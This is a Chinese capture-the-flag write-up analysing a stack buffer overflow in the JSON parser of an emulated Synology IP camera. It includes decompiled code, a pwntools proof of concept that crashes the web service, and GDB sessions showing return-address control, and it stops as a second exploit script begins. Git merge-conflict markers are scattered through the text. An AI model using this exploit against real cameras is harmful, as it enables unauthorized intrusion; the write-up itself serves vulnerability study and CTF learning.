---
title: Pwn2Own & RWCTF 6th - Let’s party in the house - 先知社区
<<<<<<< HEAD
url: https://xz.aliyun.com/t/14085
clipped_at: 2024-03-20 09:40:01
=======
url: https://xz.aliyun.com/t/14085?time__1311=mqmx9DBG0QBxlxGgx%2BxCq%3DURD8Dci%3D76YD
clipped_at: 2024-03-13 14:15:07
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
category: default
tags: 
 - xz.aliyun.com
---


# Pwn2Own & RWCTF 6th - Let’s party in the house - 先知社区

<<<<<<< HEAD
=======
Pwn2Own & RWCTF 6th - Let’s party in the house

- - -

>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
# RWCTF 6th - Let’s party in the house

> `score:378` `solve_count:6`
> 
> `pwn`, `Panasonic (PCSL)`, `difficulty:Schrödinger`
> 
<<<<<<< HEAD
> ```plain
=======
> ```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
> Oh, no, in the middle of our party, there was a strange baby cry coming from the IP Camera.
> There is only one service in the device, can you figure out the baby crying? flag path: /flag
> ```
> 
> `nc 47.88.48.133 7777`
> 
> [https://github.com/chaitin/Real-World-CTF-6th-Challenges](https://github.com/chaitin/Real-World-CTF-6th-Challenges)

## 题目配置 & 启动

给了一个 run.sh，直接启动，题目环境就可以跑起来。账号密码是 `root:root`，启动之后一直有杂乱的信息，搜索之后发现有 telnetd，重新打包一下 rcS，在 rcS 里加上 `telnetd -p 8802 -l /bin/sh`，此时 8802 就会开启 telnet，在 docker 里加上映射之后 `nc 127.0.0.1 8802` 即可获得 shell

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
#!/bin/sh
# source profile_prjcfg on /etc/init.d/rcS (init script cycle) and /etc/profile (after startup cycle)
source /etc/profile_prjcfg
telnetd -p 9901 -l /bin/sh


# fstab devices create
mount -a

echo "ker" > /proc/nvt_info/bootts
echo "rcS" > /proc/nvt_info/bootts

# To run /etc/init.d/S* script
for initscript in /etc/init.d/S[0-9][0-9]*
do
    if [ -x $initscript ]; then
        echo "[Start] $initscript"
        $initscript
    fi
done

echo "rcS" > /proc/nvt_info/bootts
telnetd -p 8802 -l /bin/sh
```

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
#!/bin/sh
qemu-system-arm \
    -m 1024 \
    -M virt,highmem=off \
    -kernel zImage \
        -initrd player.cpio \
    -nic user,hostfwd=tcp:0.0.0.0:8801-:80,hostfwd=tcp:0.0.0.0:8802-:8802 \
    -nographic
```

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
450 synodebu  0:01 telnetd -p 8802 -l /bin/sh
  453 synodebu  0:00 -sh
  545 synodebu  1:46 /bin/webd
 2452 synodebu  0:00 /bin/sh
 2717 synodebu  0:00 /bin/sh
16809 synodebu  0:00 ps
```

## 漏洞分析

发现这个[设备](https://www.synology.com/en-global/security/advisory/Synology_SA_23_15)在 Pwn2Own 2023 上被利用，并且 [TeamT5](https://teamt5.org/en/posts/teamt5-pwn2own-contest-experience-sharing-and-vulnerability-demonstration/) 公开了一些细节，在 `/lib/libjansson.so.4.7.0` 中进行 json 代码解析的时候发生了溢出漏洞，经过对比发现比赛版本正好存在此漏洞

在 parse\_object 这个函数中，解析 key 的时候发生了溢出

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
json_t *__fastcall parse_object(lex_t *lex, int flags, json_error_t *error)
{
  int v4; // r0
  char v9[32]; // [sp+14h] [bp-40h] BYREF
  char v10[12]; // [sp+34h] [bp-20h] BYREF
  size_t len; // [sp+40h] [bp-14h] BYREF
  int value; // [sp+44h] [bp-10h]
  void *key; // [sp+48h] [bp-Ch]
  json_t *object; // [sp+4Ch] [bp-8h]

  object = j_json_object();
  if ( !object )
    return 0;
  lex_scan(lex, error);
  if ( lex->token == '}' )
    return object;
  while ( 1 )
  {
    if ( lex->token != 0x100 )
    {
      error_set(error, lex, "string or '}' expected");
      goto LABEL_28;
    }
    key = lex_steal_string(lex, &len);
    if ( !key )
      return 0;
    if ( memchr(key, 0, len) )
    {
      jsonp_free(key);
      error_set(error, lex, "NUL byte in object key not supported");
      goto LABEL_28;
    }
    v10[0] = 0;
    _isoc99_sscanf(key, "%s %s", v9, v10);      // stack-based buffer overflow
    if ( (flags & 1) != 0 && j_json_object_get(object, v9) )
    {
      jsonp_free(key);
      error_set(error, lex, "duplicate object key");
      goto LABEL_28;
    }
    lex_scan(lex, error);
    if ( lex->token != 58 )
    {
      jsonp_free(key);
      error_set(error, lex, "':' expected");
      goto LABEL_28;
    }
    lex_scan(lex, error);
    value = parse_value(lex, flags, error);
    if ( !value )
    {
      jsonp_free(key);
      goto LABEL_28;
    }
    if ( v10[0] )
    {
      v4 = sub_6A04(v10);
      *(value + 8) = v4;
    }
    else
    {
      *(value + 8) = 0;
    }
    if ( sub_5170(object, v9, value) )
    {
      jsonp_free(key);
      json_decref(value);
      goto LABEL_28;
    }
    json_decref(value);
    jsonp_free(key);
    lex_scan(lex, error);
    if ( lex->token != ',' )
      break;
    lex_scan(lex, error);
  }
  if ( lex->token == '}' )
    return object;
  error_set(error, lex, "'}' expected");
LABEL_28:
  json_decref(object);
  return 0;
}
```

发现了漏洞点之后需要去找触发此漏洞的方式，经过与 libjansson 这个公开 json 解析库进行源码对比的时候发现 `parse_object` 会被 `parse_value` 调用，`parse_value` 会被 `parse_json` 调用，最后 `parse_json` 会被 `json_loads/json_loadb/json_loadf/json_loadfd/json_load_callback` 这 5 个函数调用

最后在 grep 筛选的时候只有 `json_loads` 这个接口在服务器中被调用，所以调用链为 `parse_object->parse_value->json_loads`

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
Binary file ./bin/synoaid matches
Binary file ./bin/diag matches
Binary file ./bin/systemd matches
Binary file ./bin/webd matches
Binary file ./bin/webd.id0 matches
Binary file ./bin/central_server matches
Binary file ./bin/webd.i64 matches
Binary file ./bin/synoactiond matches
Binary file ./www/uistrings/uistrings.cgi.i64 matches
Binary file ./www/uistrings/uistrings.cgi matches
Binary file ./www/uistrings/uistrings.cgi.id0 matches
Binary file ./www/cgi2/factory.cgi.i64 matches
Binary file ./www/cgi2/fwupgrade.cgi matches
Binary file ./www/cgi2/config.cgi matches
Binary file ./www/cgi2/factorydefault.cgi matches
Binary file ./www/cgi2/param.cgi matches
Binary file ./www/cgi2/factory.cgi matches
Binary file ./www/camera-cgi/synocam_fw_upgrade.cgi.i64 matches
Binary file ./www/camera-cgi/synocam_param.cgi.i64 matches
Binary file ./www/camera-cgi/synocam_fw_upgrade.cgi matches
Binary file ./www/camera-cgi/synocam_param.cgi matches
Binary file ./www/camera-cgi/synocam_log_retrieve.cgi matches
Binary file ./www/camera-cgi/synocam_reset.cgi matches
Binary file ./www/camera-cgi/synocam_system_report.cgi matches
Binary file ./lib/libjansson.so.4.7.0 matches
Binary file ./lib/libjansson.so.4.7.0.id0 matches
Binary file ./lib/libutil.so matches
Binary file ./opt/onvif/wsdd matches
Binary file ./opt/onvif/onvifd matches
```

有很多都调用了 `json_loads`，无法确定哪一个，发现 webd 是这个摄像头的 webserver，所以对其进行简要分析一下

在 webd 中发现了处理函数 `sub_35CEC`

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
int __fastcall handle_main(int *a1)
{
  int v2; // r0
  int v3; // r0
  int v4; // r0
  int v5; // r0
  int v6; // r0
  int v7; // r0
  int v8; // r0
  int v9; // r0

  sub_30F24();
  sub_30E04();
  v2 = open("/tmp/ConnInfo", 193, 420);
  if ( v2 == -1 )
  {
    if ( *_errno_location() != 17 )
      fprintf(stderr, "Failed to touch ConnInfo file [%m].\n");
  }
  else
  {
    close(v2);
  }
  sub_24C64(a1, "/syno-api", (int)sub_35CEC, 0);
  sub_24D94((int)a1, "/heartbeat/connect", (int)sub_331F4, (char)sub_33EDC, (int)sub_2D6CC, (int)sub_31BDC, 0);
  sub_24D94((int)a1, "/webstream/connect", (int)sub_3323C, (char)sub_2E97C, (int)sub_2D360, (int)sub_2D870, 0);
  sub_24D94((int)a1, "/aievent/connect", (int)sub_33284, (char)sub_2E8F4, (int)sub_2E7DC, (int)sub_2D8F8, 0);
  v3 = sub_2F5DC();
  v4 = sub_2F670(v3);
  v5 = sub_30BB4(v4);
  v6 = sub_30C48(v5);
  sub_2F704(v6);
  v7 = sub_2F798();
  v8 = sub_30CDC(v7);
  v9 = sub_30D70(v8);
  return sub_30E90(v9);
}
```

`sub_35CEC` 这里主要进行路由请求到后端不同的 cgi 处理功能点，那就需要判断出是否有功能点存在未授权访问，如果这个函数中没有找到路由请求，那就会调用 `/www/camera-cgi/synocam_param.cgi` 这个 cgi

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
int __fastcall sub_35CEC(_DWORD *a1)
{
......
  method = sub_194D8(a1);
  s1 = v62;
  v63 = v65;
  v66[0] = v67;
  v61 = 0;
  v62[0] = 0;
  v64 = 0;
  v65[0] = 0;
  v66[1] = 0;
  v67[0] = 0;
  memset(v90, 0, sizeof(v90));
  v3 = sub_8B548((int)"Custom.Activated");
  v4 = (char *)method[4];
  v5 = strlen("/syno-api");
  if ( strncmp(v4, "/syno-api", v5) )
  {
LABEL_45:
    v9 = 400;
    goto LABEL_46;
  }
  v6 = (const char *)*method;
  if ( strcmp((const char *)*method, "GET") && strcmp(v6, "PUT") && strcmp(v6, "POST") && strcmp(v6, "DELETE") )
  {
    std::string::assign(v66, "Method Not Allowed");
    v9 = 405;
    goto LABEL_46;
  }
  sub_31A40(v68, v4);
  std::string::operator=(&s1, v68);
  if ( v68[0] != &v69 )
    operator delete(v68[0]);
  if ( v3 || sub_3CC70((int)&unk_C1964, (int)&s1) || sub_3CC70((int)&unk_C1980, (int)&s1) )
  {
LABEL_7:
    path = (char *)method[4];
    if ( !strcmp(path, "/syno-api/security") || !strcmp(path, "/syno-api/security/encryption_key") )
    {
    .....

      else
      {
        if ( !strcmp(path, "/syno-api/session") && !strcmp((const char *)*method, "GET") )
        {
          if ( sub_33B2C(method) )
            sub_337D4((int)v76);
          else
            sub_31A40(v76, "Invalid session");
          std::string::operator=(&v63, v76);
          if ( v76[0] != &v77 )
            operator delete(v76[0]);
          sub_31A40(&nptr, "");
          send_page(a1, 200, &v63, &nptr);
          v48 = nptr;
          if ( nptr == (char *)v88 )
            goto LABEL_15;
          goto LABEL_146;
        }
        ......
            if ( strcmp(path, "/syno-api/camera_cap") || strcmp((const char *)*method, "GET") )
            {
              execve_cgi((int)a1, "/www/camera-cgi/synocam_param.cgi");
              goto LABEL_15;
            }
            file = json_load_file("/www/camera-cgi/synocam_cap.json", 4);
            v56 = file;
            if ( file )
            {
              sub_50DB4(&v83, file);
              sub_31A40(&nptr, "");
              send_page(a1, 200, &v83, &nptr);
              if ( nptr != (char *)v88 )
                operator delete(nptr);
              if ( v83 != v85 )
                operator delete(v83);
              pgo_free(v56);
              goto LABEL_15;
            }
            sub_4E38C(
              0,
              (int)"MID/BC500/webservice.cpp",
              3055,
              (int)"SynoHandler",
              (int)"System",
              -1,
              "pgo_load_file [%s] load failed.\n");
            goto LABEL_45;
          }
          v84 = 0;
          LOBYTE(v85[0]) = 0;
          v83 = v85;
          memset(v91, 0, sizeof(v91));
          for ( i = sub_1BA70((int)a1); i > 0; i = sub_1BA70((int)a1) )
          {
            v20 += i;
            if ( v20 > 0x100000 )
              break;
            nptr = (char *)v88;
            std::string::_M_construct<char const*>((int)&nptr, v91);
            std::string::_M_append(&v83, nptr, v87);
            if ( nptr != (char *)v88 )
              operator delete(nptr);
  ......
  return v9;
}
```

所以现在看一下有哪些路由请求可以未授权访问，一开始我是用自己写的脚本来探测的，但是后面看到了这位[师傅](https://eqqie.cn/index.php/archives/2076)的思路之后发现用到 dirsearch，查看之后发现这个工具远比我自己写的脚本好用，所以我用 dirsearch 测试了一下

grep 筛选的时候发现 `vue.bundle.js` 这个 js 里存在很多 api url，我简单的写了个脚本抓取了一下

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
import re

with open('vue.bundle.js', 'r') as f:
    text = f.read()

urls = re.findall(r'url:"(.*?)"', text)

for i in urls:
    print(i)
```

同时我也把整个 web 目录的所有文件的 url 都集合到了 wordlist.txt 里，然后使用 dirsearch 扫了一下，扫描的时候排除了 `404,301,401`

之后发现了一些 url 是存在未授权访问的

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
python3 dirsearch.py -u http://127.0.0.1:8801/ -w /your/path/wordlist.txt -x 404,301,401

[01:33:21] 200 -   24KB - /uistrings/cht/strings                            
[01:33:21] 200 -   24KB - /uistrings/chs/strings                            
[01:33:21] 200 -   27KB - /uistrings/enu/strings                            
[01:33:22] 200 -    6MB - /uistrings/uistrings.cgi.i64                      
[01:33:22] 200 -   28KB - /uistrings/dan/strings
[01:33:22] 200 -   34KB - /uistrings/jpn/strings                            
[01:33:22] 200 -   29KB - /uistrings/ptb/strings
[01:33:22] 200 -   28KB - /uistrings/nor/strings
[01:33:22] 200 -   32KB - /uistrings/hun/strings                            
[01:33:22] 200 -   29KB - /uistrings/ita/strings
[01:33:23] 200 -   29KB - /uistrings/sve/strings                            
[01:33:23] 200 -   31KB - /uistrings/ger/strings
[01:33:22] 200 -   30KB - /uistrings/krn/strings                            
[01:33:23] 200 -   31KB - /uistrings/plk/strings                            
[01:33:23] 200 -   32KB - /uistrings/fre/strings
[01:33:23] 200 -   30KB - /uistrings/ptg/strings
[01:33:23] 200 -   29KB - /uistrings/uistrings.cgi
[01:33:23] 200 -   30KB - /uistrings/nld/strings
[01:33:24] 200 -   48KB - /uistrings/rus/strings                            
[01:33:24] 200 -   61KB - /uistrings/tha/strings                            
[01:33:24] 200 -   30KB - /uistrings/trk/strings
[01:33:23] 200 -   30KB - /uistrings/spn/strings                            
[01:33:23] 200 -   29KB - /uistrings/csy/strings                            
[01:33:25] 200 -    6KB - /crypto.min.js                                    
[01:33:25] 200 -    2MB - /vue.bundle.js                                    
[01:33:25] 200 -   15B  - /syno-api/session                                 
[01:33:25] 200 -    6B  - /syno-api/activate
[01:33:25] 200 -    9B  - /syno-api/security/info/model
[01:33:25] 200 -    9B  - /syno-api/security/info/name                      
[01:33:26] 200 -   14B  - /syno-api/maintenance/firmware/version            
[01:33:26] 200 -    1MB - /style/main.css                                   
[01:33:27] 200 -    7B  - /syno-api/security/info/language                   
[01:33:27] 200 -   21B  - /syno-api/security/info/mac
[01:33:27] 200 -    6B  - /syno-api/security/network/dhcp
[01:33:27] 200 -  105B  - /syno-api/security/info
[01:33:27] 200 -    4B  - /syno-api/security/info/serial_number
```

看到了一些 `/syno-api` 的 url，而这些 url 会进入 `synocam_param.cgi`，现在分析一下 `synocam_param.cgi`

根据 format 判断返回的格式，然后根据请求方法使用不同函数处理请求

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
int __fastcall sub_7BC84(json_t *json, volatile size_t a2, json_t *a3)
{
  const char *v3; // r0
  volatile size_t refcount; // r4
  const char *v5; // r0
  volatile size_t v7; // r5
  int *v8; // r6
  const char *v9; // r0
  char *method; // [sp+10h] [bp-1Ch]

  a3->type = (json_type)json;
  a3->refcount = a2;
  v3 = (const char *)sub_E19C(json, "format");
  a3[1].type = sub_725A8(v3);
  if ( a3[1].type == JSON_INTEGER )
  {
    refcount = a3->refcount;
    v5 = (const char *)sub_E19C(json, "format");
    send_page(refcount, 400, "Unknown output format[%s]!", v5);
    return -1;
  }
  else
  {
    method = (char *)sub_E174((int)json);
    if ( method && !strcasecmp(method, "GET") )
    {
      handle_get((int)a3);
    }
    else if ( method && !strcasecmp(method, "PUT") )
    {
      handle_put(a3);
    }
    else if ( method && !strcasecmp(method, "POST") )
    {
      handle_post(a3);
    }
    else
    {
      if ( !method || strcasecmp(method, "DELETE") )
      {
        send_page(a3->refcount, 400, "Wrong request method[%s]!", method);
        return -1;
      }
      hanlde_delete(a3);
    }
    if ( off_B8218 != &dword_C8 )
    {
      v7 = a3->refcount;
      v8 = off_B8218;
      v9 = (const char *)std::string::c_str(&unk_B82F4);
      send_page(v7, v8, "%s", v9);
    }
    sub_80A70(&unk_B830C);
    return 0;
  }
}
```

在 `handle_post` 中，发现传入的数据会进入 `final_json_load`，而 `final_json_load` 里会调用 `json_loads`

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
int __fastcall sub_79FEC(_DWORD *a1)
{
......
  v1 = (const char *)sub_E19C(*a1, "json");
  v24 = final_json_load(v1);
  file = json_load_file("/www/camera-cgi/synocam_config.json", 0, 0);
  v2 = getenv("SCRIPT_NAME");
  v3 = strchr(v2 + 1, 47);
......
}

json_t *__fastcall final_json_load(const char *a1)
{
  json_t *v5; // [sp+Ch] [bp-308h]
  char v6[256]; // [sp+10h] [bp-304h] BYREF
  char s[516]; // [sp+110h] [bp-204h] BYREF

  memset(s, 0, 0x200u);
  memset(v6, 0, sizeof(v6));
  if ( !a1 )
    return 0;
  v5 = json_loads(a1, 4u, 0);
  if ( (!v5 || v5->type == JSON_NULL) && sub_10D90(a1, s, 512) == 1 )
    v5 = json_loads(s, 4u, 0);
  if ( (!v5 || v5->type == JSON_NULL) && !strchr(a1, 34) )
  {
    snprintf(v6, 0x100u, "\"%s\"", a1);
    return json_loads(v6, 4u, 0);
  }
  return v5;
}
```

至此漏洞分析完成

## Poc & 调试

我编写了如下 Poc，发现可以让目标 crash

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
from pwn import *

context(arch='arm', os='linux', log_level='debug')

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')
lg = lambda x : print('\033[32m' + str(x) + '\033[0m')

context.terminal = ['tmux','splitw','-h']

ip = '127.0.0.1'
port = 8801

r = remote(ip, port)

p1 = b'a ' + b'a' * 0x30

value = b'""'
json = b'{"' + p1 + b'": ""}'
li(json)

rn = b'\r\n'

p3 = b''
p3 += b'POST /syno-api/security/info/mac HTTP/1.1' + rn
p3 += (b"Content-Length: %d" % len(json)) +rn
p3 += b'Host: 127.0.0.1:8801' + rn
p3 += b'sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"' + rn
p3 += b'Accept: text/plain, */*; q=0.01' + rn
p3 += b'Content-Type: application/json' + rn
p3 += b'X-Requested-With: XMLHttpRequest' + rn
p3 += b'sec-ch-ua-mobile: ?0' + rn
p3 += b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36' + rn
p3 += b'sec-ch-ua-platform: "macOS"' + rn
p3 += b'Origin: http://127.0.0.1:8801' + rn
p3 += b'Sec-Fetch-Site: same-origin' + rn
p3 += b'Sec-Fetch-Mode: cors' + rn
p3 += b'Sec-Fetch-Dest: empty' + rn
p3 += b'Referer: http://127.0.0.1:8801/' + rn
p3 += b'Accept-Encoding: gzip, deflate' + rn
p3 += b'Accept-Language: zh-CN,zh;q=0.9' + rn
p3 += b'Cookie: sid=sBmrHHr4XX4TKaIjv0Vw6L3I15y46m47DO9qeF79CPjquIMOAHX6ygmRJ2AaNleg' + rn
p3 += b'Connection: close' + rn
p3 += rn
p3 += json

li('[+] sendling payload')
r.send(p3)

r.interactive()
```

接着需要去调试一下这个 Poc，看一下能否控制程序执行流，下载对应架构的 gdbserver 到文件系统中，然后 `find . | cpio -o --format=newc > ../player.cpio` 打包一下，重新启动就可以使用 gdbserver 了

添加 gdbserver 的映射端口

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
#!/bin/sh
qemu-system-arm \
    -m 1024 \
    -M virt,highmem=off \
    -kernel zImage \
        -initrd player.cpio \
    -nic user,hostfwd=tcp:0.0.0.0:8801-:80,hostfwd=tcp:0.0.0.0:8802-:8802,hostfwd=tcp:0.0.0.0:1234-:1234 \
    -nographic
```

调试方法有很多种，qemu 调试 cgi、fork + execute 调试、patch、这里已经发现了漏洞，直接采用真实的远程环境来调试 exp

采取 [GDB 调试 fork+exec 创建的子进程的方法](https://blog.csdn.net/tuzhutuzhu/article/details/23705485)来调试

attach 到 webd 这个 pid 中

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
/ # ps
ps
PID   USER     TIME  COMMAND
    1 synodebu  1:18 init
    2 synodebu  0:00 [kthreadd]
    3 synodebu  0:00 [rcu_gp]
    4 synodebu  0:00 [rcu_par_gp]
    5 synodebu  0:00 [slub_flushwq]
    7 synodebu  0:00 [kworker/0:0H-ev]
    9 synodebu  0:00 [mm_percpu_wq]
   10 synodebu  5:58 [ksoftirqd/0]
   11 synodebu  1h16 [rcu_sched]
   12 synodebu  0:00 [migration/0]
   13 synodebu  0:00 [cpuhp/0]
   14 synodebu  0:00 [kdevtmpfs]
   15 synodebu  0:00 [inet_frag_wq]
   16 synodebu  2:43 [kworker/0:1-eve]
   17 synodebu  0:00 [oom_reaper]
   18 synodebu  0:00 [writeback]
   19 synodebu  4:13 [kcompactd0]
   35 synodebu  0:00 [kblockd]
   36 synodebu  0:00 [ata_sff]
   37 synodebu  0:00 [edac-poller]
   38 synodebu  0:00 [devfreq_wq]
   39 synodebu  0:00 [watchdogd]
   40 synodebu  0:00 [kworker/u2:1-ev]
   41 synodebu  0:00 [rpciod]
   42 synodebu  0:00 [kworker/0:1H]
   43 synodebu  0:00 [kworker/u3:0]
   44 synodebu  0:00 [xprtiod]
   45 synodebu  0:00 [kswapd0]
   46 synodebu  0:00 [kworker/u2:2-ev]
   47 synodebu  0:00 [nfsiod]
   50 synodebu  0:00 [mld]
   51 synodebu  0:00 [ipv6_addrconf]
   52 synodebu  0:00 [kworker/0:2]
  129 synodebu  0:00 inetd
  208 synodebu  0:00 /bin/kmesg_monitor
  210 synodebu  7h57 /bin/systemd
  232 synodebu 12:11 ntpdaemon
  240 synodebu 17:31 syslogd -b 1 -s 200 -n -f /tmp/syslogd.conf
  318 synodebu  0:41 wpa_supplicant -ieth0 -Dwired -c /tmp/wpa_supplicant-eth0.
  322 synodebu  0:05 zcip -f eth0 /bin/zcipnotify
  330 synodebu  1:00 dhcpcd: eth0 [ip4]
  363 synodebu 11h34 /bin/streamd
  367 synodebu 34:09 /bin/central_server
  369 synodebu 33:35 /bin/synoactiond
  375 synodebu 20:25 /bin/recorder
  428 synodebu  0:01 telnetd -p 9901 -l /bin/sh
  431 synodebu  0:00 init
  559 synodebu  5h33 /bin/webd
 4853 synodebu  0:00 /bin/sh
 4858 synodebu  0:00 ps
 / # gdbserver :1234 --attach 559
gdbserver :1234 --attach 559
Attached; pid = 559
Listening on port 123
```

用 gdb-multiarch 连上来之后就可以发现已经可以调试 webd 了

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
pwndbg> set follow-fork-mode parent                                                                      
pwndbg> c                                                                                                
Continuing.                                                                                               
[Detaching after vfork from child process 6200]                                                     
[Detaching after fork from child process 6201]
```

有个 vfork，跳过这个 vfork，直接捕获一下 fork

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
pwndbg> set follow-fork-mode parent                                                                      
pwndbg> catch fork
pwndbg> c
```

此时 vfork 已经被跳过，此时已经到了 fork 这里，跟进 cgi 程序，捕获 exec 之后就可以发现已经到了 synocam\_param.cgi，但是会卡住，虽然会卡住，但是不影响执行命令，回车之后继续 Continuing，此时发现目标 crash

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
pwndbg> set follow-fork-mode child                                                                      
pwndbg> catch exec
pwndbg> c
......
Thread 2.1 "synocam_param.c" hit Catchpoint 2 (exec'd /www/camera-cgi/synocam_param.cgi), 0x76fcea00 in ?? () from target:/lib/ld-linux-armhf.so.3

Continuing.
Reading /lib/libjansson.so.4 from remote target...
Reading /lib/libutil.so from remote target...
Reading /lib/libpthread.so.0 from remote target...
Reading /lib/libcurl.so.4 from remote target...
Reading /lib/libcrypto.so.1.1 from remote target...
Reading /lib/libssl.so.1.1 from remote target...
Reading /lib/libz.so.1 from remote target...
Reading /lib/libdl.so.2 from remote target...
Reading /usr/lib/libstdc++.so.6 from remote target...
Reading /lib/libm.so.6 from remote target...
Reading /lib/libgcc_s.so.1 from remote target...
Reading /lib/libc.so.6 from remote target...

Thread 2.1 "synocam_param.c" received signal SIGSEGV, Segmentation fault.
0x76fb7f88 in ?? () from target:/lib/libjansson.so.4
```

crash 之后的状态

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
──────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────
*R0   0x7efff240 ◂— 'aaaa'
 R1   0x0
 R2   0x0
*R3   0x61616161 ('aaaa')
*R4   0x4b7954 ◂— 0xb77f4
 R5   0x0
*R6   0x407464 ◂— mov fp, #0
 R7   0x0
 R8   0x0
 R9   0x0
*R10  0x4b7954 ◂— 0xb77f4
*R11  0x7efff144 —▸ 0x7efff15c —▸ 0x76fb4c40 ◂— ldr r3, [fp, #-0x48]
 R12  0x0
*SP   0x7efff138 ◂— 0x0
*PC   0x76fb7f88 ◂— strb r2, [r3]
────────────────────────────────────[ DISASM / arm / set emulate on ]─────────────────────────────────────
 ► 0x76fb7f88    strb   r2, [r3]
   0x76fb7f8c    nop
   0x76fb7f90    add    sp, fp, #0
   0x76fb7f94    pop    {fp}
   0x76fb7f98    bx     lr

   0x76fb7f9c    str    fp, [sp, #-4]!
   0x76fb7fa0    add    fp, sp, #0
   0x76fb7fa4    sub    sp, sp, #0xc
   0x76fb7fa8    str    r0, [fp, #-8]
   0x76fb7fac    ldr    r3, [fp, #-8]
   0x76fb7fb0    ldr    r3, [r3]
```

## 漏洞利用

为了方便调试，直接写个脚本来捕获 cgi

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
target remote :1234
set follow-fork-mode parent
catch fork
c
set follow-fork-mode child
catch exec
c
```

此时卡住之后发现 cgi 没有被彻底载入

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     Start        End Perm     Size Offset File
  0x400000   0x4a7000 r-xp    a7000      0 /www/camera-cgi/synocam_param.cgi
  0x4b7000   0x4b9000 rw-p     2000  a7000 /www/camera-cgi/synocam_param.cgi
0x76fce000 0x76fee000 r-xp    20000      0 /lib/ld-2.30.so
0x76ffb000 0x76ffc000 r-xp     1000      0 [sigpage]
0x76ffc000 0x76ffd000 r--p     1000      0 [vvar]
0x76ffd000 0x76ffe000 r-xp     1000      0 [vdso]
0x76ffe000 0x77000000 rw-p     2000  20000 /lib/ld-2.30.so
0x7efdf000 0x7f000000 rw-p    21000      0 [stack]
0xffff0000 0xffff1000 r-xp     1000      0 [vectors]
```

在 0x7464 这里下断点之后就可以看到 `/lib/libjansson.so.4.7.0` 的地址，此时跟据这个基址在漏洞点下一个断点，就可以调试漏洞点了

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
......
0x76fae000 0x76fbd000 r-xp     f000      0 /lib/libjansson.so.4.7.0
0x76fbd000 0x76fcc000 ---p     f000   f000 /lib/libjansson.so.4.7.0
0x76fcc000 0x76fcd000 r--p     1000   e000 /lib/libjansson.so.4.7.0
0x76fcd000 0x76fce000 rw-p     1000   f000 /lib/libjansson.so.4.7.0
......
pwndbg> b *0x76fae000 + 0x6BE0
Breakpoint 4 at 0x76fb4be0
pwndbg> c
Continuing.

Thread 2.1 "synocam_param.c" hit Breakpoint 4, 0x76fb4be0 in ?? () from target:/lib/libjansson.so.4
```

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
pwndbg> b *0x76fae000 + 0x6BE4
Breakpoint 5 at 0x76fb4be4
pwndbg> c
Continuing
......
pwndbg> x/20wx 0x7efff174
0x7efff174:     0x76fd0061      0x00000001      0x76ff7000      0x7efff168
0x7efff184:     0x7bfff210      0x7b000001      0x00000001      0x7efff1ab
0x7efff194:     0x61616161      0x61616161      0x61616161      0x61616161
0x7efff1a4:     0x61616161      0x61616161      0x61616161      0x61616161
0x7efff1b4:     0x61616161      0x61616161      0x61616161      0x61616161
```

调试之后，如下 Poc 就可以劫持返回地址为 0x62626262 了

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
from pwn import *

context(arch='arm', os='linux', log_level='debug')

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')
lg = lambda x : print('\033[32m' + str(x) + '\033[0m')

context.terminal = ['tmux','splitw','-h']

